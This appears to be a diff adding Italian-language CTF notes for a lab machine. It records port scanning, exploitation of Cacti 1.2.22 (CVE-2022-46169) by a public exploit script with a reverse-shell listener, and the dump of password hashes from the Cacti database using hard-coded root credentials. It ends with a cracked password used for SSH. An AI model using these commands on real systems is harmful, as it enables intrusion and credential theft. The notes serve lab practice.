@@ -1,0 +1,83 @@
+--------------------------NMAP------------------------------
+Aperte porte 
+22 -> ssh
+80 -> http su server nginx 1.8.0
+
+--------------------------WEB------------------------------
+Cacti v.1.2.22 -> Remote Code Execution exploit
+
+
+Script exploit cacti 1.2.22 -> https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22
+python3 CVE-2022-46169-CACTI-1.py -u http:10.10.11.211 --LHOST={IPHOST} --LPORT={80/443}
+sudo nc -lnvp 80
+----------------SHELL CREATA------------------------------
+bash-5.1$cd ../../../
+bash-5.1$ls
+bin
+boot
+c
+cmd
+dev
+entrypoint.sh
+etc
+evil-helper
+home
+lib
+lib64
+media
+mnt
+o
+opt
+proc
+root
+run
+sbin
+srv
+sys
+tmp
+usr
+var
+xyx_payload.sh
+
+bash-5.1$cat entrypoint.sh
+#!/bin/bash
+set -ex
+
+wait-for-it db:3306 -t 300 -- echo "database is connected"
+if [[ ! $(mysql --host=db --user=root --password=root cacti -e "show tables") =~ "automation_devices" ]]; then
+    mysql --host=db --user=root --password=root cacti < /var/www/html/cacti.sql
+    mysql --host=db --user=root --password=root cacti -e "UPDATE user_auth SET must_change_password='' WHERE username = 'admin'"
+    mysql --host=db --user=root --password=root cacti -e "SET GLOBAL time_zone = 'UTC'"
+fi
+
+chown www-data:www-data -R /var/www/html
+# first arg is `-f` or `--some-option`
+if [ "${1#-}" != "$1" ]; then
+        set -- apache2-foreground "$@"
+fi
+
+exec "$@"
+
+----------------------------QUERY MYSQL PER TROVARE GLI USER NELLA TABELLA USER_AUTH DEL DATABASE--------------------------------------------------------------
+
+bash-5.1$mysql --host=db --user=root --password=root cacti -e "select * from user_auth"
+< --password=root cacti -e "select * from user_auth"
+id      username        password        realm   full_name       email_address   must_change_password    password_change show_tree       show_list       show_preview    graph_settings        login_opts      policy_graphs   policy_trees    policy_hosts    policy_graph_templates  enabled lastchange      lastlogin       password_history        lockedfailed_attempts lastfail        reset_perms
+1       admin   $2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC    0       Jamie Thompson  admin@monitorstwo.htb           on      on      on      on      on   21       1       1       1       on      -1      -1      -1              0       0       663348655
+3       guest   43e9a4ab75570f5b        0       Guest Account           on      on      on      on      on      3       1       1       1       1       1               -1   -1       -1              0       0       0
+4       marcus  $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C    0       Marcus Brune    marcus@monitorstwo.htb                  on      on      on      on   11       1       1       1       on      -1      -1              on      0       0       2135691668
+
+---------------------------------------------------------------------------CREDENZIALI--------------------------------------------------------------
+
+admin   $2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC Jamie Thompson  admin@monitorstwo.htb  			
+guest   43e9a4ab75570f5b Guest Account
+marcus  $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C Marcus Brune    marcus@monitorstwo.htb			HASH: funkymonkey
+
+
+---------------------------------------------------------------------------CONNESSIONE TRAMITE SSH----------------------------------------------------
+ssh marcus@10.10.11.211
+password: funkymonkey
+
+marcus@monitorstwo: cat user.txt
+
+
